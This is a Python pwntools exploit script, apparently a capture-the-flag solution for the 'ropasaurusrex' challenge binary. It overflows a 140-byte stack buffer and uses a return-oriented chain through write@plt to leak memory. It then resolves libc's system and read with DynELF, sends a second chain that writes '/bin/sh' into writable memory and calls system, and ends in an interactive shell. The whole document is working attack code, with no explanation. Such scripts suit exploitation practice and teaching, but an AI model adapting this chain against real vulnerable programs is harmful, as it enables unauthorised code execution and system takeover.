#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.arch = 'i386'

p = process('./ropasaurusrex')
elf = ELF('./ropasaurusrex')

write_plt = elf.plt['write']
start_addr = 0x8048340

def leak(addr):
    payload = flat(
        'A' * 140, 
        write_plt, 
        start_addr, 
        1, 
        addr, 
        4
    )
    p.sendline(payload)
    data = p.recv(4)
    print hex(addr) + ' ==> ' + enhex(data)
    return data

#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrex
prog = DynELF(leak, 0x8048000)
bases = prog.bases()
info(bases)
for l in bases:
	if 'libc.so.6' in l:
		ptr = bases[l]

info('ptr => ' + hex(ptr))
libc = DynELF(leak, ptr)
system_addr = libc.lookup('system')
read_addr = libc.lookup('read')
info('system_addr = ' + hex(system_addr))
info('read_addr = ' + hex(read_addr))

#  0x8049000  0x804a000 rw-p     1000 0      /root/tmp/ropasaurusrex
buf = 0x8049000
payload = flat(
    'A' * 140, 
    read_addr, 
    system_addr, 
    0, 
    buf, 
    len('/bin/sh\x00')
)
p.sendline(payload)
p.sendline('/bin/sh\x00')

p.interactive()
